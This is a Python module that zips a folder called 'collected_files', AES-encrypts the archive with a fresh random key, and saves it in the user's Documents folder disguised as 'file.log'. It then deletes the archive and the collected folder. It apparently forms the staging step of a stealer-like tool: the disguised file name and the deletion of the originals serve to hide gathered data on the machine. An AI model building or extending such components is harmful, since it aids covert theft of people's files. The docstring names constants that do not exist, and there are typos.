
import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

FOLDER_COLLECTION  = "collected_files"
ARCHIVE_FILE       = "collected_archive.zip"
ENCRYPTED_NEW_FILE = "file.log"  # NEW encrypted filename


def encrypt_data(data: bytes, key: bytes):
    iv = os.urandom(16)  # Generate random IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder    = sym_padding.PKCS7(128).padder()
    padded    = padder.update(data) + padder.finalize()
    ct        = encryptor.update(padded) + encryptor.finalize()
    return iv + ct, iv



def generate_key():
    return os.urandom(32)  # Make a 256-bit AES key



def encrypt_folder() -> (str, bytes): # type: ignore
    """Zip COLLECTED_FOLDER → ARCHIVE_NAME, encrypt it → ENCRYPTED_FILENAME, return path & key."""
    # 1. Create ZIP archive of the collected folder
    shutil.make_archive("collected_archive", 'zip', FOLDER_COLLECTION)
    with open(ARCHIVE_FILE, 'rb') as f:
        raw = f.read()

    # 2. Encrypttion
    key= generate_key()
    encrypted, iv = encrypt_data(raw, key)

    # 3. Write encrypted file to Documents as FILE.LOG
    docs = os.path.join(os.path.expanduser("~"), "Documents")
    os.makedirs(docs, exist_ok=True)
    out_path = os.path.join(docs, ENCRYPTED_NEW_FILE)
    with open(out_path, 'wb') as f:
        f.write(encrypted)

    # 4. Clean up ZIP and collected folder
    os.remove(ARCHIVE_FILE)
    shutil.rmtree(FOLDER_COLLECTION, ignore_errors=True)

    print(f"file has been encrypte successfully and saved to: {out_path}")
    return out_path, key
